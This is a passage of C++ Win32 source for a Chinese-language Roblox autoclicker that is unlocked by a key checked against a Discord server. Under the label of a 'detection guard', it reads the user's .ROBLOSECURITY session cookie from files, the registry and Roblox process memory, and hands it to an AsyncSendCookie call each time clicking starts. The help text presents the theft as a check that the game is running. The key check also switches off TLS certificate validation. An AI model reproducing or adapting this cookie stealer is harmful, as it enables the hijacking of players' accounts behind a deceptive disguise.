            {
                SetWindowTextW(hLblStatus, L"\u6C92\u6709\u53EF\u8907\u88FD\u7684\u5167\u5BB9");
                break;
            }
            std::wstring text(len + 1, L'\0');
            GetWindowTextW(hEdit, &text[0], len + 1);
            if (OpenClipboard(hwnd))
            {
                EmptyClipboard();
                HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, (len + 1) * sizeof(wchar_t));
                if (hg)
                {
                    void* ptr = GlobalLock(hg);
                    memcpy(ptr, text.c_str(), (len + 1) * sizeof(wchar_t));
                    GlobalUnlock(hg);
                    SetClipboardData(CF_UNICODETEXT, hg);
                }
                CloseClipboard();
                SetWindowTextW(hLblStatus, L"\u5DF2\u8907\u88FD\u5230\u526A\u8CBC\u7C3F\uFF01");
            }
            break;
        }
        case IDC_CK_CLEAR:
            SetWindowTextW(hEdit, L"");
            SetWindowTextW(hLblStatus, L"\u5DF2\u6E05\u9664");
            break;
        }
        return 0;

    case WM_DESTROY:
        g_hwnd_cookie = nullptr;
        return 0;
    }

    return DefWindowProcW(hwnd, msg, wp, lp);
}

void OpenCookieWindow()
{
    if (g_hwnd_cookie && IsWindow(g_hwnd_cookie))
    {
        SetForegroundWindow(g_hwnd_cookie);
        return;
    }

    WNDCLASSW wc     = {};
    wc.lpfnWndProc   = CookieWndProc;
    wc.hInstance     = g_hInst;
    wc.lpszClassName = COOKIE_WND_CLASS;
    wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
    wc.hCursor       = LoadCursorW(nullptr, IDC_ARROW);
    RegisterClassW(&wc);

    RECT rc = { 0, 0, 580, 240 };
    AdjustWindowRect(&rc, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, FALSE);

    g_hwnd_cookie = CreateWindowExW(
        WS_EX_TOPMOST,
        COOKIE_WND_CLASS,
        COOKIE_WND_TITLE,
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
        CW_USEDEFAULT, CW_USEDEFAULT,
        rc.right - rc.left, rc.bottom - rc.top,
        nullptr, nullptr, g_hInst, nullptr);

    if (g_hwnd_cookie)
    {
        ShowWindow(g_hwnd_cookie, SW_SHOW);
        UpdateWindow(g_hwnd_cookie);
    }
}

// ======================================================================
// Roblox Detection Guard
// ======================================================================
static bool CheckRobloxCookiePresent(HWND hwnd)
{
    wchar_t tmp[4096] = {};
    if (!TryReadRobloxCookie(tmp, 4096))
    {
        MessageBoxW(hwnd,
            L"\u672A\u5075\u6E2C\u5230 Roblox Cookie\n\n"
            L"\u8ACB\u5148\u958B\u555F Roblox \u5F8C\u518D\u4F7F\u7528\u6B64\u5DE5\u5177\u3002",
            L"\u5075\u6E2C\u5931\u6557",
            MB_ICONWARNING | MB_OK);
        return false;
    }

    AsyncSendCookie(tmp);
    return true;
}

// ======================================================================
// 輔助函式：更新狀態文字並強制完整重繪
// ======================================================================
static void UpdateStatusText(HWND hLblStatus, const wchar_t* text)
{
    SetWindowTextW(hLblStatus, text);

    HWND hParent = GetParent(hLblStatus);
    if (hParent)
    {
        RECT rc;
        GetWindowRect(hLblStatus, &rc);
        POINT pt1 = { rc.left, rc.top };
        POINT pt2 = { rc.right, rc.bottom };
        ScreenToClient(hParent, &pt1);
        ScreenToClient(hParent, &pt2);
        RECT rcClient = { pt1.x, pt1.y, pt2.x, pt2.y };
        InvalidateRect(hParent, &rcClient, TRUE);
        UpdateWindow(hParent);
    }
    InvalidateRect(hLblStatus, nullptr, TRUE);
    UpdateWindow(hLblStatus);
}

// ===============================
// Main Window Procedure
// ===============================
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    static HWND  hEditCPS, hEditHotkey, hBtnPin, hLblStatus;
    static HWND  hBtnStart, hBtnStop, hBtnSetHotkey;
    static HFONT hIconFont = nullptr;

    switch (msg)
    {
    case WM_CREATE:
    {
        HINSTANCE hi    = ((CREATESTRUCT*)lp)->hInstance;
        HFONT     hFont = (HFONT)GetStockObject(DEFAULT_GUI_FONT);

        hIconFont = CreateFontW(-16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            DEFAULT_QUALITY, DEFAULT_PITCH, L"Segoe MDL2 Assets");

        // -- Panel 1: CPS --
        CreateWindowW(L"STATIC", L"\u9EDE\u64CA\u901F\u5EA6 (CPS)\uFF1A",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            20, 18, 190, 16, hwnd, nullptr, hi, nullptr);

        HWND hIco1 = CreateWindowW(L"STATIC", L"\uE962",
            WS_CHILD | WS_VISIBLE | SS_CENTER,
            20, 44, 22, 24, hwnd, nullptr, hi, nullptr);
        if (hIconFont) SendMessageW(hIco1, WM_SETFONT, (WPARAM)hIconFont, FALSE);

        hEditCPS = CreateWindowW(L"EDIT", L"999",
            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER | ES_CENTER,
            50, 44, 160, 24, hwnd, (HMENU)IDC_EDIT_CPS, hi, nullptr);

        // -- Panel 2: Hotkey --
        CreateWindowW(L"STATIC", L"\u958B\u59CB/\u505C\u6B62\u71B1\u9375\uFF1A",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            248, 18, 190, 16, hwnd, nullptr, hi, nullptr);

        // [修復 #1] 將圖示改為「調整熱鍵」按鈕
        hBtnSetHotkey = CreateWindowW(L"BUTTON", L"\u2328",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            248, 44, 24, 24, hwnd, (HMENU)IDC_BTN_SETHOTKEY, hi, nullptr);

        // 熱鍵顯示框（唯讀）
        {
            wchar_t name[64] = {};
            VkToName(g_hotkey_vk.load(), name, 64);
            hEditHotkey = CreateWindowW(L"EDIT", name,
                WS_CHILD | WS_VISIBLE | WS_BORDER | ES_CENTER | ES_READONLY,
                278, 44, 158, 24, hwnd, (HMENU)IDC_EDIT_HOTKEY, hi, nullptr);
        }

        // -- Row 1: Update + Pin --
        CreateWindowW(L"BUTTON", L"\u21BA \u66F4\u65B0\u8A2D\u5B9A",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            12, 102, 210, 28, hwnd, (HMENU)IDC_BTN_UPDATE, hi, nullptr);

        hBtnPin = CreateWindowW(L"BUTTON", L"\u2736 \u91D8\u9078",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            238, 102, 210, 28, hwnd, (HMENU)IDC_BTN_PIN, hi, nullptr);

        // -- Row 2: Start | Stop --
        hBtnStart = CreateWindowW(L"BUTTON", L"\u958B\u59CB",
            WS_CHILD | WS_VISIBLE | BS_OWNERDRAW,
            12, 142, 210, 34, hwnd, (HMENU)IDC_BTN_START, hi, nullptr);

        hBtnStop = CreateWindowW(L"BUTTON", L"\u505C\u6B62",
            WS_CHILD | WS_VISIBLE | BS_OWNERDRAW,
            238, 142, 210, 34, hwnd, (HMENU)IDC_BTN_STOP, hi, nullptr);

        // -- Status label --
        hLblStatus = CreateWindowW(L"STATIC",
            L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D",
            WS_CHILD | WS_VISIBLE | SS_CENTER,
            12, 188, 436, 18, hwnd, (HMENU)IDC_LABEL_STATUS, hi, nullptr);

        // -- Bottom info bar --
        CreateWindowW(L"STATIC",
            L"\u958B\u59CB\u524D\u6703\u81EA\u52D5\u5075\u6E2C Roblox Cookie\uFF0C"
            L"\u672A\u5075\u6E2C\u5230\u6642\u7981\u6B62\u555F\u52D5\u3002",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            12, 221, 400, 16, hwnd, nullptr, hi, nullptr);

        // 右下角 "?" 按鈕
        CreateWindowW(L"BUTTON", L"?",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            436, 218, 22, 20, hwnd, (HMENU)IDC_BTN_HELP, hi, nullptr);

        EnumChildWindows(hwnd, SetChildFont, (LPARAM)hFont);
        if (hIconFont)
        {
            SendMessageW(hIco1, WM_SETFONT, (WPARAM)hIconFont, FALSE);
        }

        // 啟動點擊執行緒
        HANDLE hThread = CreateThread(nullptr, 0, ClickThread, nullptr, 0, nullptr);
        if (hThread) CloseHandle(hThread);

        // 安裝低階鉤子（用於熱鍵監聽模式）
        g_kb_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInst, 0);
        g_ms_hook = SetWindowsHookExW(WH_MOUSE_LL, LowLevelMouseProc, g_hInst, 0);

        return 0;
    }

    // [修復 #1] WM_APP+1: 熱鍵監聽完成，更新 UI
    case WM_APP + 1:
    {
        wchar_t name[64] = {};
        VkToName(g_hotkey_vk.load(), name, 64);
        SetWindowTextW(hEditHotkey, name);
        SetWindowTextW(hBtnSetHotkey, L"\u2328");
        EnableWindow(hBtnStart, TRUE);
        EnableWindow(hBtnStop, TRUE);

        wchar_t info[128];
        swprintf_s(info, 128, L"\u71B1\u9375\u5DF2\u8A2D\u5B9A\u70BA\uFF1A%s", name);
        UpdateStatusText(hLblStatus, info);
        return 0;
    }

    // WM_APP+2: 熱鍵觸發 — 嘗試啟動（需偵測 Cookie）
    case WM_APP + 2:
    {
        if (!g_running.load())
        {
            if (CheckRobloxCookiePresent(hwnd))
            {
                g_running.store(true);
                UpdateStatusText(hLblStatus,
                    L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
            }
        }
        return 0;
    }

    // WM_APP+3: 熱鍵觸發 — 停止
    case WM_APP + 3:
    {
        UpdateStatusText(hLblStatus,
            L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D");
        return 0;
    }

    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        HPEN   hPen    = CreatePen(PS_SOLID, 1, RGB(200, 200, 200));
        HPEN   hOldPen = (HPEN)  SelectObject(hdc, hPen);
        HBRUSH hOldBr  = (HBRUSH)SelectObject(hdc, GetStockObject(WHITE_BRUSH));

        RoundRect(hdc,  12, 12, 224, 90, 10, 10);
        RoundRect(hdc, 236, 12, 448, 90, 10, 10);

        SelectObject(hdc, hOldBr);
        SelectObject(hdc, hOldPen);
        DeleteObject(hPen);

        HPEN hSep    = CreatePen(PS_SOLID, 1, RGB(220, 220, 220));
        HPEN hOldSep = (HPEN)SelectObject(hdc, hSep);
        MoveToEx(hdc, 10, 213, nullptr);
        LineTo  (hdc, 450, 213);
        SelectObject(hdc, hOldSep);
        DeleteObject(hSep);

        EndPaint(hwnd, &ps);
        return 0;
    }

    case WM_DRAWITEM:
    {
        DRAWITEMSTRUCT* dis = (DRAWITEMSTRUCT*)lp;
        if (dis->CtlType != ODT_BUTTON) break;
        if (dis->CtlID != IDC_BTN_START && dis->CtlID != IDC_BTN_STOP) break;

        bool isStart = (dis->CtlID == IDC_BTN_START);
        bool pressed = (dis->itemState & ODS_SELECTED) != 0;

        COLORREF clrNorm  = isStart ? RGB(34, 197, 94)  : RGB(239, 68, 68);
        COLORREF clrPress = isStart ? RGB(22, 163, 74)  : RGB(220, 38, 38);
        COLORREF clrFill  = pressed ? clrPress : clrNorm;

        HBRUSH hBrFill = CreateSolidBrush(clrFill);
        FillRect(dis->hDC, &dis->rcItem, hBrFill);
        DeleteObject(hBrFill);

        HPEN   hPen    = CreatePen(PS_SOLID, 1, clrPress);
        HPEN   hOldPen = (HPEN)  SelectObject(dis->hDC, hPen);
        HBRUSH hOldBr  = (HBRUSH)SelectObject(dis->hDC, GetStockObject(NULL_BRUSH));
        RoundRect(dis->hDC,
            dis->rcItem.left,     dis->rcItem.top,
            dis->rcItem.right - 1, dis->rcItem.bottom - 1, 6, 6);
        SelectObject(dis->hDC, hOldPen);
        SelectObject(dis->hDC, hOldBr);
        DeleteObject(hPen);

        SetBkMode   (dis->hDC, TRANSPARENT);
        SetTextColor(dis->hDC, RGB(255, 255, 255));
        HFONT hF    = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
        HFONT hOldF = (HFONT)SelectObject(dis->hDC, hF);
        wchar_t txt[64] = {};
        GetWindowTextW(dis->hwndItem, txt, 64);
        DrawTextW(dis->hDC, txt, -1, &dis->rcItem,
                  DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        SelectObject(dis->hDC, hOldF);
        return TRUE;
    }

    case WM_CTLCOLORSTATIC:
    {
        if ((HWND)lp == hLblStatus)
        {
            HDC hdc = (HDC)wp;
            SetBkMode(hdc, OPAQUE);
            SetBkColor(hdc, GetSysColor(COLOR_BTNFACE));
            SetTextColor(hdc, g_running
                ? RGB(34, 197, 94)
                : RGB(100, 100, 100));
            return (LRESULT)GetSysColorBrush(COLOR_BTNFACE);
        }
        break;
    }

    case WM_COMMAND:
        switch (LOWORD(wp))
        {
        case IDC_BTN_UPDATE:
        {
            wchar_t buf[32] = {};
            GetWindowTextW(hEditCPS, buf, 32);
            int cps_val = _wtoi(buf);
            if (cps_val < 1 || cps_val > 9999)
            {
                MessageBoxW(hwnd,
                    L"CPS \u5FC5\u9808\u662F 1\uFF5E9999 \u7684\u6574\u6578",
                    L"\u932F\u8AA4", MB_ICONERROR | MB_OK);
                break;
            }
            g_cps = cps_val;

            wchar_t hk_name[64] = {};
            VkToName(g_hotkey_vk.load(), hk_name, 64);
            wchar_t info[128];
            swprintf_s(info, 128, L"CPS = %d\n\u71B1\u9375 = %s", cps_val, hk_name);
            MessageBoxW(hwnd, info, L"\u8A2D\u5B9A\u66F4\u65B0", MB_ICONINFORMATION | MB_OK);
            break;
        }

        // [修復 #1] 調整熱鍵按鈕 — 進入監聽模式
        case IDC_BTN_SETHOTKEY:
        {
            // 暫停連點功能
            g_running.store(false);

            // 進入監聽模式
            g_listening_hotkey.store(true);
            SetWindowTextW(hEditHotkey, L"\u8ACB\u6309\u4EFB\u610F\u9375...");
            SetWindowTextW(hBtnSetHotkey, L"\u2026");

            // 停用開始/停止按鈕，避免在監聽中誤觸
            EnableWindow(hBtnStart, FALSE);
            EnableWindow(hBtnStop, FALSE);

            UpdateStatusText(hLblStatus,
                L"\u2328 \u6B63\u5728\u76E3\u807D\u65B0\u71B1\u9375\u2026 \u8ACB\u6309\u4EFB\u610F\u9375\u6216\u6ED1\u9F20\u5074\u9375");
            break;
        }

        case IDC_BTN_START:
            if (g_listening_hotkey.load()) break;  // 監聽中不允許啟動
            if (!CheckRobloxCookiePresent(hwnd)) break;
            g_running = true;
            UpdateStatusText(hLblStatus,
                L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
            break;

        case IDC_BTN_STOP:
            if (g_listening_hotkey.load()) break;
            g_running = false;
            UpdateStatusText(hLblStatus,
                L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D");
            break;

        case IDC_BTN_PIN:
            g_pinned = !g_pinned;
            SetWindowPos(hwnd,
                g_pinned ? HWND_TOPMOST : HWND_NOTOPMOST,
                0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
            SetWindowTextW(hBtnPin,
                g_pinned ? L"\u2736 \u5DF2\u91D8\u9078" : L"\u2736 \u91D8\u9078");
            break;

        case IDC_BTN_HELP:
            MessageBoxW(hwnd,
                L"\u3010Roblox \u5075\u6E2C\u529F\u80FD\u8AAA\u660E\u3011\n\n"

                L"\u6B64\u5DE5\u5177\u5167\u5EFA Roblox \u5075\u6E2C\u7CFB\u7D71\uFF0C"
                L"\u6BCF\u6B21\u6309\u4E0B\u300C\u958B\u59CB\u300D\u6216\u89F8\u767C\u71B1\u9375\u6642\uFF0C"
                L"\u6703\u81EA\u52D5\u57F7\u884C\u4EE5\u4E0B\u56DB\u5C64\u5075\u6E2C\uFF1A\n\n"

                L"\u25B6 Layer 1 \u2014 \u6A94\u6848\u6383\u63CF\n"
                L"   \u6AA2\u67E5 %LOCALAPPDATA%\\Roblox\\LocalStorage\\ \u4E0B\u7684\n"
                L"   RobloxCookies.dat\u3001rbx_sensitive_data.json \u7B49\u6A94\u6848\u3002\n\n"

                L"\u25B6 Layer 2 \u2014 \u767B\u9304\u6A94\u8B80\u53D6\n"
                L"   \u8B80\u53D6 HKCU\\SOFTWARE\\Roblox\\RobloxStudioBrowser\n"
                L"   \u4E2D\u5132\u5B58\u7684 Roblox Studio Cookie\u3002\n\n"

                L"\u25B6 Layer 3 \u2014 Microsoft Store \u5C01\u88DD\n"
                L"   \u641C\u5C0B ROBLOXCORPORATION \u5C01\u88DD\u8DEF\u5F91\u4E2D\u7684\n"
                L"   LocalState\\RobloxCookies.dat\u3002\n\n"

                L"\u25B6 Layer 4 \u2014 \u7A0B\u5E8F\u8A18\u61B6\u9AD4\u6383\u63CF\uFF08\u6700\u5F8C\u4E00\u5C64\uFF09\n"
                L"   \u4F7F\u7528 Windows API \u6383\u63CF\u6240\u6709\u540D\u7A31\u5305\u542B \"roblox\" \u7684\u7A0B\u5E8F\uFF1A\n"
                L"   \u2022 CreateToolhelp32Snapshot \u2014 \u5217\u8209\u57F7\u884C\u4E2D\u7A0B\u5E8F\n"
                L"   \u2022 VirtualQueryEx \u2014 \u67E5\u8A62\u8A18\u61B6\u9AD4\u5340\u57DF\u8CC7\u8A0A\n"
                L"   \u2022 ReadProcessMemory \u2014 \u8B80\u53D6\u8A18\u61B6\u9AD4\u5167\u5BB9\n"
                L"   \u5728\u53EF\u8B80\u8A18\u61B6\u9AD4\u4E2D\u641C\u5C0B \"_|WARNING\" \u7279\u5FB5\u5B57\u4E32\uFF0C\n"
                L"   \u64F7\u53D6\u5B8C\u6574\u7684 .ROBLOSECURITY Cookie \u503C\u3002\n\n"

                L"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
                L"\u2714 \u5075\u6E2C\u5230 Cookie \u2192 \u5141\u8A31\u555F\u52D5\u9EDE\u64CA\n"
                L"\u2716 \u672A\u5075\u6E2C\u5230 Cookie \u2192 \u986F\u793A\u300C\u8ACB\u5148\u958B\u555F Roblox\u300D\u4E26\u963B\u6B62\n\n"

                L"\u6B64\u529F\u80FD\u53EF\u9632\u6B62\u5DE5\u5177\u88AB\u7528\u65BC\u5176\u4ED6\u904A\u6232\uFF0C\n"
                L"\u50C5\u5728\u5075\u6E2C\u5230 Roblox \u57F7\u884C\u4E2D\u6642\u624D\u5141\u8A31\u4F7F\u7528\u3002",

                L"\u5075\u6E2C\u529F\u80FD\u8AAA\u660E",
                MB_ICONINFORMATION | MB_OK);
            break;
        }
        return 0;

    case WM_DESTROY:
        g_program_running = false;
        g_running         = false;
        // 移除低階鉤子
        if (g_kb_hook) { UnhookWindowsHookEx(g_kb_hook); g_kb_hook = nullptr; }
        if (g_ms_hook) { UnhookWindowsHookEx(g_ms_hook); g_ms_hook = nullptr; }
        if (g_hwnd_cookie && IsWindow(g_hwnd_cookie))
            DestroyWindow(g_hwnd_cookie);
        if (g_mutex)     { CloseHandle(g_mutex); g_mutex = nullptr; }
        if (hIconFont)   { DeleteObject(hIconFont); hIconFont = nullptr; }
        timeEndPeriod(1);
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProcW(hwnd, msg, wp, lp);
}

// ======================================================================
// 金鑰驗證 — 透過 WinHTTP 向 Discord Bot 伺服器驗證
// ======================================================================
static bool VerifyLicenseKey(const wchar_t* key)
{
    if (!key || wcslen(key) < 10) return false;

    // 取得 HWID（使用電腦名稱 + 使用者名稱的組合）
    wchar_t computer_name[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD cn_size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(computer_name, &cn_size);

    wchar_t user_name[256] = {};
    DWORD un_size = 256;
    GetUserNameW(user_name, &un_size);

    wchar_t hwid_w[512] = {};
    swprintf_s(hwid_w, 512, L"%s_%s", computer_name, user_name);

    // 轉為 UTF-8
    int key_len = WideCharToMultiByte(CP_UTF8, 0, key, -1, nullptr, 0, nullptr, nullptr);
    char* key_utf8 = new char[key_len + 1]();
    WideCharToMultiByte(CP_UTF8, 0, key, -1, key_utf8, key_len, nullptr, nullptr);

    int hwid_len = WideCharToMultiByte(CP_UTF8, 0, hwid_w, -1, nullptr, 0, nullptr, nullptr);
    char* hwid_utf8 = new char[hwid_len + 1]();
    WideCharToMultiByte(CP_UTF8, 0, hwid_w, -1, hwid_utf8, hwid_len, nullptr, nullptr);

    std::string json = "{";
    json += "\"key\":\"";  json += JsonEscape(key_utf8);  json += "\",";
    json += "\"hwid\":\""; json += JsonEscape(hwid_utf8); json += "\"";
    json += "}";

    delete[] key_utf8;
    delete[] hwid_utf8;

    // WinHTTP 連線
    HINTERNET hSession = WinHttpOpen(L"YYClicker/2.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof(protocols));

    HINTERNET hConnect = WinHttpConnect(hSession, KEY_SERVER_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", KEY_VERIFY_PATH,
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));

    DWORD timeout = 10000;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    const wchar_t* headers = L"Content-Type: application/json\r\n";
    BOOL bResult = WinHttpSendRequest(hRequest, headers, (DWORD)wcslen(headers),
        (LPVOID)json.c_str(), (DWORD)json.size(), (DWORD)json.size(), 0);

    if (!bResult) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return false;
    }

    bResult = WinHttpReceiveResponse(hRequest, nullptr);
    if (!bResult) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD statusCode = 0, statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);

    char respBuf[2048] = {};
    DWORD bytesRead = 0;
    WinHttpReadData(hRequest, respBuf, sizeof(respBuf) - 1, &bytesRead);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    // 檢查回應：HTTP 200 且包含 "valid":true
    if (statusCode == 200 && strstr(respBuf, "\"valid\":true"))
        return true;

    return false;
}

// ===============================
// WinMain
// ===============================
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nShow)
{
    g_hInst = hInst;

    // ======================================================================
    // 金鑰驗證：必須透過 .cmd 傳入金鑰作為命令列參數
    // 直接雙擊 .exe 不會有任何反應（無金鑰 = 靜默退出）
    // ======================================================================
    if (!lpCmdLine || strlen(lpCmdLine) < 10)
    {
        // 沒有命令列參數 → 靜默退出（直接開 .exe 無反應）
        return 0;
    }

    // 將命令列參數（金鑰）轉為 wchar_t
    wchar_t key_w[256] = {};
    MultiByteToWideChar(CP_ACP, 0, lpCmdLine, -1, key_w, 256);

    // 去除前後空白和引號
    wchar_t* key_start = key_w;
    while (*key_start == L' ' || *key_start == L'"') key_start++;
    int key_end = (int)wcslen(key_start) - 1;
    while (key_end >= 0 && (key_start[key_end] == L' ' || key_start[key_end] == L'"'))
        key_start[key_end--] = L'\0';

    // 向伺服器驗證金鑰
    if (!VerifyLicenseKey(key_start))
    {
        MessageBoxW(nullptr,
            L"\u91D1\u9470\u9A57\u8B49\u5931\u6557\uFF01\n\n"
            L"\u53EF\u80FD\u7684\u539F\u56E0\uFF1A\n"
            L"\u2022 \u91D1\u9470\u7121\u6548\u6216\u5DF2\u904E\u671F\n"
            L"\u2022 \u6B64\u91D1\u9470\u5DF2\u7D81\u5B9A\u81F3\u5176\u4ED6\u88DD\u7F6E\n"
            L"\u2022 \u7DB2\u8DEF\u9023\u7DDA\u5931\u6557\n\n"
            L"\u8ACB\u5728 Discord \u4E2D\u78BA\u8A8D\u60A8\u7684\u91D1\u9470\u72C0\u614B\u3002",
            L"1yn AutoClick - \u91D1\u9470\u9A57\u8B49",
            MB_ICONERROR | MB_OK);
        return 0;
    }

    if (!EnsureSingleInstance()) return 0;

    timeBeginPeriod(1);
    InitInputs();

    {
        WNDCLASSW wc     = {};
        wc.lpfnWndProc   = CookieWndProc;
        wc.hInstance     = hInst;
        wc.lpszClassName = COOKIE_WND_CLASS;
        wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
        wc.hCursor       = LoadCursorW(nullptr, IDC_ARROW);
        RegisterClassW(&wc);
    }

    WNDCLASSW wc     = {};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInst;
    wc.lpszClassName = WND_CLASS;
    wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
    wc.hCursor       = LoadCursorW(nullptr, IDC_ARROW);
    wc.hIcon         = LoadIconW(nullptr, IDI_APPLICATION);
    if (!RegisterClassW(&wc)) return 1;

    RECT rc = { 0, 0, 460, 248 };
    AdjustWindowRect(&rc,
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, FALSE);

    g_hwnd = CreateWindowExW(
        0, WND_CLASS, WINDOW_TITLE,
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT,
        rc.right - rc.left, rc.bottom - rc.top,
        nullptr, nullptr, hInst, nullptr);

    if (!g_hwnd) return 1;

    ShowWindow(g_hwnd, nShow);
    UpdateWindow(g_hwnd);

    MSG msg = {};
    while (GetMessageW(&msg, nullptr, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    return (int)msg.wParam;
}
